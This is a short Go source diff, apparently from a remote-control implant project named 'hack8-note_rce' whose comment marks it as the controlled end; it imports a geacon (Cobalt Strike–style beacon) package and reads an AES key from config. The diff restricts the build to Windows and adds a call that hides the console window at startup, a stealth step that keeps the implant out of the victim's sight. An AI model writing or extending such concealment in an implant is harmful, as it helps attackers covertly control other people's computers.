@@ -1,3 +1,5 @@
+//go:build windows
+
 package main
 
 //被控制端
@@ -6,6 +8,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"github.com/lifei6671/gorand"
+	"github.com/lxn/win"
 	"hack8-note_rce/Util"
 	"hack8-note_rce/config"
 	"hack8-note_rce/geacon"
@@ -23,7 +26,9 @@ var noteaddr string
 func main() {
 
 	//test
+
 	//test
+	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
 
 	//从配置文件获取的参数
 	aeskey := config.Aeskey
